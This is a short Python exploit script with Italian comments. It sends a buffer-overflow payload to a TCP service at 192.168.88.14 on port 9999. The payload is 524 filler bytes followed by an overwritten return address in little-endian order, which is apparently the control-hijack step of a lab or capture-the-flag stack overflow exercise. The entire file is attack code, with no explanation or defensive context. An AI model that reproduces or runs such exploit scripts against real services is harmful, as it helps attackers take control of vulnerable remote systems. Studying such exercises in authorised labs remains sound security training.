#!/usr/bin/python
import sys, socket
from time import sleep

# dopo i 524 bytes ci dobbiamo scrivere l'indirizzo  311712f3 "al contrario" (Little Endian)
shellcode = "A" * 524 + "\xf3\x12\x17\x31" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.88.14',9999))
	s.send((shellcode))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
